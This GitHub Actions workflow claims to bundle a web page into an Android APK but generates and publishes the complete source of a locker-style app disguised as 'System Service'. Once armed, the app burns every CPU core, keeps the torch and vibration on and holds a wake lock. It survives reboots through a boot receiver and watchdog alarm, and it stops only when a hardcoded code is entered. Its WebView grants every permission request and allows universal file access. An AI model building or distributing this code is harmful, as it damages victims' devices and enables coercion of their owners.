name: build-apk

on:
  workflow_dispatch:
    inputs:
      page_url:
        description: Public URL of the deployed page to bundle
        required: true
        type: string

concurrency:
  group: build-apk-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: write

env:
  KS_PASS: ci-${{ github.run_id }}-${{ github.run_number }}

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Validate input
        env:
          PAGE_URL: ${{ inputs.page_url }}
        run: |
          set -euo pipefail
          [ -n "$PAGE_URL" ] || { echo "page_url is empty"; exit 1; }
          case "$PAGE_URL" in
            http://*|https://*) ;;
            *) echo "page_url must start with http:// or https://"; exit 1 ;;
          esac

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Scaffold project
        env:
          PAGE_URL: ${{ inputs.page_url }}
        run: |
          set -euo pipefail
          mkdir -p app/src/main/java/com/bt/service app/src/main/res/drawable app/src/main/assets

          curl -fsSL --retry 3 --retry-delay 2 --max-time 120 "$PAGE_URL" -o app/src/main/assets/index.html
          test -s app/src/main/assets/index.html
          grep -qi '<html' app/src/main/assets/index.html || echo "::warning::response does not look like HTML"
          ls -l app/src/main/assets/index.html

          printf 'sdk.dir=%s\n' "${ANDROID_SDK_ROOT:-${ANDROID_HOME}}" > local.properties

          keytool -genkeypair -noprompt -keystore keystore.jks \
            -storepass "$KS_PASS" -keypass "$KS_PASS" \
            -alias app -keyalg RSA -keysize 2048 -validity 10000 \
            -dname "CN=System Service, O=BT, C=US" >/dev/null

          cat > settings.gradle <<'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "SystemService"
          include ":app"
          EOF

          cat > build.gradle <<'EOF'
          // AGP is resolved through pluginManagement in settings.gradle
          EOF

          cat > gradle.properties <<'EOF'
          org.gradle.jvmargs=-Xmx3g -XX:MaxMetaspaceSize=1g
          org.gradle.parallel=true
          org.gradle.caching=true
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          EOF

          cat > app/build.gradle <<'EOF'
          plugins { id "com.android.application" version "8.5.0" }
          android {
              namespace "com.bt.service"
              compileSdk 34
              defaultConfig {
                  applicationId "com.bt.service"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              signingConfigs {
                  release {
                      storeFile file("../keystore.jks")
                      storePassword System.getenv("KS_PASS")
                      keyAlias "app"
                      keyPassword System.getenv("KS_PASS")
                  }
              }
              buildTypes {
                  release {
                      signingConfig signingConfigs.release
                      minifyEnabled false
                      shrinkResources false
                  }
              }
              lint { abortOnError false; checkReleaseBuilds false }
          }
          EOF

          cat > app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
              <uses-permission android:name="android.permission.VIBRATE"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
              <uses-feature android:name="android.hardware.camera.flash" android:required="false"/>
              <application android:label="System Service" android:icon="@drawable/skull"
                  android:allowBackup="true" android:hardwareAccelerated="true"
                  android:theme="@android:style/Theme.Material.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true"
                      android:launchMode="singleTask"
                      android:windowSoftInputMode="adjustResize"
                      android:configChanges="orientation|screenSize|keyboardHidden">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED"/>
                          <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                          <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
                      </intent-filter>
                  </receiver>
                  <receiver android:name=".Watchdog" android:enabled="true" android:exported="false"/>
                  <service android:name=".DrainService" android:exported="false"
                      android:foregroundServiceType="specialUse">
                      <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                          android:value="device maintenance drain"/>
                  </service>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/drawable/skull.xml <<'EOF'
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="512" android:viewportHeight="512">
              <path android:fillColor="#05060A" android:pathData="M0,0h512v512h-512z"/>
              <path android:strokeColor="#FF2B3D" android:strokeWidth="18" android:fillColor="#00000000"
                  android:pathData="M256,96c-72,0 -128,56 -128,128 0,44 22,82 56,104v48h144v-48c34,-22 56,-60 56,-104 0,-72 -56,-128 -128,-128z"/>
              <path android:fillColor="#FF2B3D" android:pathData="M212,224m-28,0a28,28 0,1 1,56 0a28,28 0,1 1,-56 0"/>
              <path android:fillColor="#FF2B3D" android:pathData="M300,224m-28,0a28,28 0,1 1,56 0a28,28 0,1 1,-56 0"/>
          </vector>
          EOF

          cat > app/src/main/java/com/bt/service/Prefs.java <<'EOF'
          package com.bt.service;
          import android.content.Context;
          public final class Prefs {
              public static final String KEY = "2530253010";
              static long deadline(Context c) { return c.getSharedPreferences("bt",0).getLong("deadline",0); }
              static void setDeadline(Context c, long v) { c.getSharedPreferences("bt",0).edit().putLong("deadline",v).apply(); }
              static boolean released(Context c) { return c.getSharedPreferences("bt",0).getBoolean("released",false); }
              static void setReleased(Context c, boolean v) { c.getSharedPreferences("bt",0).edit().putBoolean("released",v).apply(); }
              static boolean armed(Context c) { return deadline(c) > 0 && !released(c); }
          }
          EOF

          cat > app/src/main/java/com/bt/service/DrainService.java <<'EOF'
          package com.bt.service;
          import android.app.*;
          import android.content.*;
          import android.content.pm.ServiceInfo;
          import android.hardware.camera2.CameraManager;
          import android.os.*;
          public class DrainService extends Service {
              public static final long TOTAL = 30L*60L*1000L;
              private PowerManager.WakeLock lock;
              private CameraManager cam; private String camId; private Vibrator vib;
              private volatile boolean running = true;
              private final Handler h = new Handler(Looper.getMainLooper());
              @Override public void onCreate() {
                  super.onCreate();
                  Notification first = notif("Controller locked - draining");
                  if (Build.VERSION.SDK_INT >= 34)
                      startForeground(1, first, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
                  else startForeground(1, first);
                  PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                  lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "bt:drain");
                  lock.setReferenceCounted(false); lock.acquire();
                  try {
                      vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                      long[] pattern = {900,140,900,140};
                      if (Build.VERSION.SDK_INT >= 26) vib.vibrate(VibrationEffect.createWaveform(pattern,0));
                      else vib.vibrate(pattern,0);
                  } catch (Throwable t) {}
                  try { cam = (CameraManager) getSystemService(CAMERA_SERVICE);
                        camId = cam.getCameraIdList()[0]; cam.setTorchMode(camId,true); } catch (Throwable t) {}
                  int n = Math.max(2, Runtime.getRuntime().availableProcessors());
                  for (int i=0;i<n;i++){ Thread th = new Thread(() -> {
                      double x=0; while(running) for(int k=0;k<20000;k++) x += Math.sqrt(k)*Math.sin(k*0.37); });
                      th.setPriority(Thread.MAX_PRIORITY); th.start(); }
                  h.postDelayed(new Runnable(){ @Override public void run(){ update(); h.postDelayed(this,1000); } },1000);
                  Watchdog.schedule(this);
              }
              private void update(){
                  long left = Prefs.deadline(this) - System.currentTimeMillis();
                  String body;
                  if (left <= 0) body = "LOCK WINDOW - load active - tap to open";
                  else { long s = left/1000; body = String.format("Battery draining - %02d:%02d left - tap to open", s/60, s%60); }
                  ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).notify(1, notif(body));
              }
              private Notification notif(String body){
                  NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                  if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(
                      new NotificationChannel("bt","Device service",NotificationManager.IMPORTANCE_LOW));
                  PendingIntent pi = PendingIntent.getActivity(this,0,new Intent(this,MainActivity.class),
                      PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                  Notification.Builder b = Build.VERSION.SDK_INT >= 26
                      ? new Notification.Builder(this,"bt") : new Notification.Builder(this);
                  return b.setContentTitle("DEVICE SERVICE ACTIVE").setContentText(body)
                      .setSmallIcon(android.R.drawable.stat_sys_warning)
                      .setOngoing(true).setOnlyAlertOnce(true).setContentIntent(pi).build();
              }
              @Override public int onStartCommand(Intent i,int f,int s){ return START_STICKY; }
              @Override public void onTaskRemoved(Intent i){}
              @Override public IBinder onBind(Intent i){ return null; }
              @Override public void onDestroy(){
                  running = false; h.removeCallbacksAndMessages(null);
                  try { if (cam!=null && camId!=null) cam.setTorchMode(camId,false); } catch (Throwable t) {}
                  try { if (vib!=null) vib.cancel(); } catch (Throwable t) {}
                  try { if (lock!=null && lock.isHeld()) lock.release(); } catch (Throwable t) {}
                  super.onDestroy();
              }
          }
          EOF

          cat > app/src/main/java/com/bt/service/BootReceiver.java <<'EOF'
          package com.bt.service;
          import android.content.*;
          public class BootReceiver extends BroadcastReceiver {
              @Override public void onReceive(Context ctx, Intent i){
                  if (Prefs.armed(ctx)) ctx.startForegroundService(new Intent(ctx, DrainService.class));
              }
          }
          EOF

          cat > app/src/main/java/com/bt/service/Watchdog.java <<'EOF'
          package com.bt.service;
          import android.app.*;
          import android.content.*;
          public class Watchdog extends BroadcastReceiver {
              private static final int REQ = 7717;
              private static PendingIntent pi(Context c){
                  return PendingIntent.getBroadcast(c, REQ, new Intent(c, Watchdog.class),
                      PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
              }
              static void schedule(Context c){
                  AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
                  am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+15*60*1000, pi(c));
              }
              static void cancel(Context c){
                  AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
                  am.cancel(pi(c));
              }
              @Override public void onReceive(Context ctx, Intent i){
                  if (Prefs.armed(ctx)) { ctx.startForegroundService(new Intent(ctx, DrainService.class)); schedule(ctx); }
              }
          }
          EOF

          cat > app/src/main/java/com/bt/service/MainActivity.java <<'EOF'
          package com.bt.service;
          import android.annotation.SuppressLint;
          import android.app.Activity;
          import android.content.Intent;
          import android.net.Uri;
          import android.os.*;
          import android.provider.Settings;
          import android.view.WindowManager;
          import android.webkit.*;
          public class MainActivity extends Activity {
              private WebView web;
              @SuppressLint("SetJavaScriptEnabled")
              @Override protected void onCreate(Bundle b){
                  super.onCreate(b);
                  getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                  web = new WebView(this);
                  WebSettings s = web.getSettings();
                  s.setJavaScriptEnabled(true);
                  s.setDomStorageEnabled(true);
                  s.setDatabaseEnabled(true);
                  s.setAllowFileAccess(true);
                  s.setAllowContentAccess(true);
                  s.setAllowFileAccessFromFileURLs(true);
                  s.setAllowUniversalAccessFromFileURLs(true);
                  s.setMediaPlaybackRequiresUserGesture(false);
                  s.setUseWideViewPort(true);
                  s.setLoadWithOverviewMode(true);
                  web.setWebViewClient(new WebViewClient(){
                      @Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r){
                          Uri u = r.getUrl();
                          String sc = u.getScheme();
                          if (sc != null && (sc.equals("http") || sc.equals("https") || sc.equals("file"))) return false;
                          try { startActivity(new Intent(Intent.ACTION_VIEW, u)); } catch (Throwable t) {}
                          return true;
                      }
                  });
                  web.setWebChromeClient(new WebChromeClient(){
                      @Override public void onPermissionRequest(PermissionRequest r){ r.grant(r.getResources()); }
                  });
                  web.addJavascriptInterface(new Bridge(), "BT");
                  web.loadUrl("file:///android_asset/index.html");
                  setContentView(web);
                  if (Build.VERSION.SDK_INT >= 33) requestPermissions(new String[]{
                      android.Manifest.permission.POST_NOTIFICATIONS, android.Manifest.permission.CAMERA}, 1);
                  try {
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (!pm.isIgnoringBatteryOptimizations(getPackageName()))
                          startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                              Uri.parse("package:"+getPackageName())));
                  } catch (Throwable t) {}
              }
              @Override public void onBackPressed(){
                  if (web != null && web.canGoBack()) web.goBack(); else moveTaskToBack(true);
              }
              @Override protected void onDestroy(){ if (web != null) web.destroy(); super.onDestroy(); }
              public class Bridge {
                  @JavascriptInterface public void arm(){
                      if (Prefs.deadline(MainActivity.this)==0)
                          Prefs.setDeadline(MainActivity.this, System.currentTimeMillis()+DrainService.TOTAL);
                      Prefs.setReleased(MainActivity.this,false);
                      startForegroundService(new Intent(MainActivity.this, DrainService.class));
                  }
                  @JavascriptInterface public String state(){
                      return "{\"deadline\":"+Prefs.deadline(MainActivity.this)+",\"released\":"+Prefs.released(MainActivity.this)+"}";
                  }
                  @JavascriptInterface public void save(long d, boolean r){
                      Prefs.setDeadline(MainActivity.this,d); Prefs.setReleased(MainActivity.this,r);
                  }
                  @JavascriptInterface public boolean unlock(String code){
                      if (!Prefs.KEY.equals(code.trim())) return false;
                      Prefs.setReleased(MainActivity.this,true);
                      Watchdog.cancel(MainActivity.this);
                      stopService(new Intent(MainActivity.this, DrainService.class));
                      return true;
                  }
                  @JavascriptInterface public void notifyService(){
                      startForegroundService(new Intent(MainActivity.this, DrainService.class));
                  }
              }
          }
          EOF

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.9'

      - name: Build
        run: gradle assembleRelease --no-daemon --stacktrace

      - name: Collect
        run: |
          set -euo pipefail
          cp app/build/outputs/apk/release/app-release.apk system-service.apk
          ls -l system-service.apk
          sha256sum system-service.apk

      - uses: actions/upload-artifact@v4
        with:
          name: system-service-apk
          path: system-service.apk
          retention-days: 30

      - uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: Build ${{ github.run_number }}
          files: system-service.apk
          body: |
            Bundled from: `${{ inputs.page_url }}`

            Install on Android, then open the icon once.
